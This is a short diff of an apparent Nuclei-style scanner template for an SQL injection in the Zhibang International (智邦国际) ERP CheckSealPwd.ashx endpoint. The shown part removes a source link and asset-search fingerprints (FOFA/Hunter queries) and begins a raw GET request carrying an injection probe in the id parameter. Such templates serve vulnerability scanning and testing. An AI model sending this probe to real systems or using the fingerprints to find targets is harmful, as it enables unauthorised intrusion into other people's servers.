@@ -3,12 +3,8 @@ info:
   name: 智邦国际-CheckSealPwd-SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ograruoxvstl1zqg'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ograruoxvstl1zqg
-    fofa: 'fofa: body="/SYSN/" hunter: app.name="智邦国际 ERP"'
 http:
 - raw:
   - 'GET /SYSN/json/pcclient/CheckSealPwd.ashx?pwd=1&id=1--+ HTTP/1.1
